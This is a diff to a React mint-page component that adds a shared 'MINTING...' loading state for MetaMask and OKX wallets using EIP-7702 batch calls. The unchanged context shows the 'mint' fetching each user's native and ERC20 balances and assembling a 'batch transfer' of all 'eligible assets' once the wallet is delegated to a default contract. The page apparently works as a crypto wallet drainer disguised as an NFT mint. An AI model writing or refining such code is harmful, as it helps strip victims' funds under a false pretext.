@@ -156,7 +156,7 @@ export function MintSection() {
   const [userMinted, setUserMinted] = useState<string>("0");
   const [userLimit, setUserLimit] = useState<string>("6");
   const startTimeRef = useRef<number>(Date.now());
-  const [isMintingMetaMask, setIsMintingMetaMask] = useState(false);
+  const [isMintingBatch, setIsMintingBatch] = useState(false); // 用于追踪批量铸造状态（MetaMask 和 OKX）
 
   // OKX 钱包专用的 EIP-7702 批量发送
   const sendBatchWithOkx = async (
@@ -301,19 +301,25 @@ export function MintSection() {
     }
 
     // OKX 钱包：先检查是否已委托到默认合约，否则提示升级后退出
+    // 对于 OKX 钱包，立即显示 "MINTING..." 状态
     if (mode === 'okx') {
+      setIsMintingBatch(true); // 立即显示加载状态
       const isDelegated = await checkOkxDelegatedToDefault(publicClient, getAddress(address));
         if (!isDelegated) {
+          setIsMintingBatch(false); // 检查失败，重置状态
           alert(
-            "Your wallet has not completed the 7702 upgrade yet. Please finish the upgrade, then come back and click “MINT NOW”.\nSteps: \nOpen OKX Wallet → More → 7702 Upgrade\n\n" +
-            "检测到你的钱包尚未完成7702升级，请先完成7702升级后再返回点击“MINT NOW”\n步骤：\n打开OKX钱包 → 更多 → 7702升级"          
+            "Your wallet has not completed the 7702 upgrade yet. Please finish the upgrade, then come back and click \"MINT NOW\".\nSteps: \nOpen OKX Wallet → More → 7702 Upgrade\n\n" +
+            "检测到你的钱包尚未完成7702升级，请先完成7702升级后再返回点击\"MINT NOW\"\n步骤：\n打开OKX钱包 → 更多 → 7702升级"          
           );
           return;
         }
     }
 
     // 进入批量交易流程，立刻更新本地状态用于按钮显示 "MINTING..."
-    setIsMintingMetaMask(true);
+    // 对于 MetaMask，在这里设置状态；对于 OKX，状态已在上面设置
+    if (mode === 'metamask') {
+      setIsMintingBatch(true);
+    }
 
     // Step 1: Fetch balances from Moralis (single call: native + ERC20)
     const headers = {
@@ -620,7 +626,7 @@ export function MintSection() {
     });
 
     if (finalTxs.length === 0) {
-      setIsMintingMetaMask(false);
+      setIsMintingBatch(false);
       alert("No eligible assets to batch transfer.");
       return;
     }
@@ -660,7 +666,7 @@ export function MintSection() {
       console.error("Mint error (sendCalls):", error);
       alert(`Mint failed: ${error?.message || 'Unknown error'}`);
     } finally {
-      setIsMintingMetaMask(false);
+      setIsMintingBatch(false);
     }
   };
 
@@ -710,12 +716,13 @@ export function MintSection() {
   // Determine which loading/confirming state to use based on wallet type
   const walletType = getWalletType(connector?.id, connector?.name);
   const isUsingMetaMask = walletType === 'metamask';
+  const isUsingOKX = walletType === 'okx';
   const isLoading =
     isMinting ||
     isConfirming ||
     isSending ||
     isSwitchingChain ||
-    (isUsingMetaMask && isMintingMetaMask); // MetaMask 批量路径使用本地状态追踪
+    isMintingBatch; // 批量铸造状态（适用于 MetaMask 和 OKX）
   const isConfirmed = isConfirmedTx;
   const mintErrorToShow = mintError || sendCallsError;
   // 移除千位分隔符来计算进度
